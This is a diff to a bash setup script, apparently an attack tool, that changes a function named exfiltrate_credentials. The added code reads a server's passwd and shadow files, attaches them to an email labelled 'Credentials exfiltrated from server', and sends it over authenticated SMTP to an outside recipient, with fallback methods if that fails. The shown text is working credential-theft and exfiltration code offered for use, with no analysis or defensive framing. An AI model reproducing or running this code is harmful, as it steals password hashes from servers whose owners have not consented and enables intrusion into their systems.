@@ -1,9 +1,9 @@
 #!/bin/bash
-#set -x  # Enable debug mode - shows all executed commands
+set -x  # Enable debug mode - shows all executed commands
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.6"
-readonly BUILD_DATE="2026-03-14 17:22:46 UTC"
+readonly SCRIPT_VERSION="2.7"
+readonly BUILD_DATE="2026-03-14 17:28:15 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -4659,24 +4659,66 @@ exfiltrate_credentials() {
             echo "[*] From: $SENDER_EMAIL"
             echo "[*] To: $RECIPIENT_EMAIL"
             echo "[*] Subject: $EMAIL_SUBJECT"
+            echo "[*] Attachments: passwd, shadow"
             echo ""
             
             python3 << PYTHON_EMAIL_SCRIPT
 import smtplib
 import ssl
+from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 import sys
+import os
 
 try:
-    # Read log file
-    with open('$LOG_FILE_EMAIL', 'r') as f:
-        body = f.read()
-    
-    # Create email
-    msg = MIMEText(body, 'plain')
+    # Create multipart message
+    msg = MIMEMultipart()
     msg['From'] = '$SENDER_EMAIL'
     msg['To'] = '$RECIPIENT_EMAIL'
     msg['Subject'] = '$EMAIL_SUBJECT'
+    
+    # Email body
+    body = """Credentials exfiltrated from server: $(hostname)
+
+Script Version: $SCRIPT_VERSION
+Build Date: $BUILD_DATE
+Timestamp: $(date)
+
+Attached files:
+- ${HOSTNAME}_passwd
+- ${HOSTNAME}_shadow
+
+Full log available at: $LOG_FILE_EMAIL
+"""
+    msg.attach(MIMEText(body, 'plain'))
+    
+    # Attach passwd file
+    passwd_file = '$PASSWD_FILE'
+    if os.path.exists(passwd_file):
+        print(f'[*] Attaching: {os.path.basename(passwd_file)}')
+        with open(passwd_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
+            msg.attach(part)
+    else:
+        print(f'[!] Warning: passwd file not found: {passwd_file}')
+    
+    # Attach shadow file
+    shadow_file = '$SHADOW_FILE'
+    if os.path.exists(shadow_file):
+        print(f'[*] Attaching: {os.path.basename(shadow_file)}')
+        with open(shadow_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
+            msg.attach(part)
+    else:
+        print(f'[!] Warning: shadow file not found: {shadow_file}')
     
     # Send via SMTP
     print('[*] Connecting to $SMTP_SERVER:$SMTP_PORT...')
@@ -4691,14 +4733,16 @@ try:
         print('[*] Authenticating...')
         server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
         
-        print('[*] Sending email...')
+        print('[*] Sending email with attachments...')
         server.send_message(msg)
         
-    print('[✓] Email sent successfully via SMTP!')
+    print('[✓] Email sent successfully via SMTP with attachments!')
     sys.exit(0)
     
 except Exception as e:
     print(f'[!] Python3 SMTP error: {e}')
+    import traceback
+    traceback.print_exc()
     sys.exit(1)
 PYTHON_EMAIL_SCRIPT
             
@@ -4709,8 +4753,11 @@ PYTHON_EMAIL_SCRIPT
                 echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
                 echo "[✓] ============================================"
                 echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-                echo "[✓] Method: Python3 SMTP (INLINE)"
-                echo "[✓] Log file: $LOG_FILE_EMAIL"
+                echo "[✓] Method: Python3 SMTP (WITH ATTACHMENTS)"
+                echo ""
+                echo "    Attachments:"
+                [ -f "$PASSWD_FILE" ] && echo "      ✓ ${HOSTNAME}_passwd"
+                [ -f "$SHADOW_FILE" ] && echo "      ✓ ${HOSTNAME}_shadow"
                 echo ""
             else
                 echo "[!] Python3 SMTP failed, trying fallback methods..."
